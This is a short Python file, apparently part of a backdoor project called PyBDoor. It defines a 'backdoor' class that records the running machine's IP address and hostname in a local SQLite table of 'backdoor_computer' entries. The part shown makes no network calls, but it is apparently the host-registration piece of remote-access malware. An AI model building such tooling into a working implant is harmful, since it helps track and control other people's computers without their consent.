import sqlite3,socket

class backdoor:
    def __init__(self):
        self.db = sqlite3.connect("C:/Users/armen/Documents/Github/PyBDoor/server/db.sqlite3")
        self.cursor = self.db.cursor()

        pcs = self.cursor.execute("SELECT * FROM backdoor_computer").fetchall()
        self.pc_id = None
        for pc in pcs:
            if socket.gethostbyname(socket.gethostname()) == pc[1]:
                self.pc_id = pc[0]

        print(self.pc_id)
        if self.pc_id == None:
            sql_code = """INSERT INTO backdoor_computer
                      (ip_addr, pc_name)
                      VALUES (?, ?)
            """
            
            self.cursor.execute(sql_code, (socket.gethostbyname(socket.gethostname()),socket.gethostname()))
            self.db.commit()

backdoor()